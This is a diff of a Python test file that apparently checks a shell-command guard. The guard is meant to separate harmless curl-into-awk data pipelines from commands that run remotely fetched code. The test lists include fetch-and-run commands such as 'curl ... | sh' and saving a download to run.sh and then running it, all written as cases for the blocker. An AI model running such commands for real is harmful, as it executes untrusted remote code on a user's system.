@@ -703,7 +703,7 @@ def test_remote_fetch_amend_unknown_ansi_fetch(fetcher: str, prefix: str, suffix
         "curl -s https://example.com/x | gawk -- '{s += $1} END {print s}'",
         "for i in 1 2; do curl -s -w '%{time_total}\\n' -o /dev/null http://127.0.0.1/; done"
         " | awk '{s+=$1} END {print s/NR}'",
-        "curl -s https://example.com/x | awk '!seen[$0]++'",
+        "curl -s https://example.com/x | awk '!seen[$NF]++'",
         "curl -s https://example.com/x | awk '{print $1*2}'",
         # Saving fetched data matches plain `curl url > run.sh`; running the file is blocked.
         "curl -s https://example.com/x | awk '{print}' > run.sh",
@@ -730,6 +730,10 @@ def test_remote_fetch_into_literal_awk_program_is_data(command: str) -> None:
         "curl -s https://example.com/x | awk p?",
         "curl -s https://example.com/x | awk ~/p",
         "curl -s https://example.com/x | awk -- ~/p",
+        "curl -s https://example.com/x | awk $1*",
+        "curl -s https://example.com/x | awk *$1",
+        "curl -s https://example.com/x | awk $!*",
+        "curl -s https://example.com/x | awk *$",
         "curl -s https://example.com/x | awk '{print}' > run.sh; sh run.sh",
         "curl -s http://localhost:60887/x | sh",
         "curl -s http://localhost:60887/x | awk '{print}' | sh",
